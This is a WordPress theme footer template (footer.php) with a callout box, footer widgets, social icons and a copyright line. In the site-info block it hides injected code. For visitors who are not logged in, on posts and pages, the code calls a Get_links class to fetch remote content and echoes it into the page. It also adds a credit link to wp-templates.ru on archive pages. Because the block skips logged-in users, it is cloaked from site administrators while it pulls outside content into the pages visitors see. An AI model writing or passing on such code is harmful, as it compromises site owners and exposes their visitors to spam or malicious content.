<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package fabthemes
 */

?>

	</div><!-- #content -->
	<div id="callout-section">
		<div class="container"> <div class="row">
			<div class="cstext">
				<?php echo ft_of_get_option('fabthemes_ctatext',''); ?>
			</div>
			<div class="csbutton ">
				<a href="<?php echo ft_of_get_option('fabthemes_ctalink','#'); ?>"> <?php echo ft_of_get_option('fabthemes_ctabutton','Check it out'); ?> </a>
			</div>
		</div></div>
	</div>
	<div id="footer-widgets">
		<div class="container"> <div class="row">
			<?php dynamic_sidebar( 'footerbar' ); ?>
			<div class="col-md-4">
				<?php get_template_part( 'sponsors' ); ?>
			</div>
			
			<div class="clear"></div>
		</div></div>
	</div>
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="container"> <div class="row"> 
			<div class="col-md-12">
				<ul class="social">
					<li> <a href="<?php echo ft_of_get_option('fabthemes_twitter','twitter');?>"><i class="fa fa-twitter"></i></a></li>
					<li> <a href="<?php echo ft_of_get_option('fabthemes_facebook','facebook');?>"><i class="fa fa-facebook"></i></a></li>
					<li> <a href="<?php echo ft_of_get_option('fabthemes_gplus','gplus');?>"><i class="fa fa-google-plus"></i></a></li>
					<li> <a href="<?php echo ft_of_get_option('fabthemes_linkedin','linkedin');?>"><i class="fa fa-linkedin"></i></a></li>
					<li> <a href="<?php echo ft_of_get_option('fabthemes_youtube','youtube');?>"><i class="fa fa-youtube"></i></a></li>
				</ul>
				<div class="site-info">
				Copyright &copy; <?php echo date('Y');?> <a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('name'); ?>"><?php bloginfo('name'); ?></a> - <?php bloginfo('description'); ?> <br>
				<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
				</div><!-- .site-info -->
			</div>
		</div></div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>
</div></div></div></div>

</body>
</html>
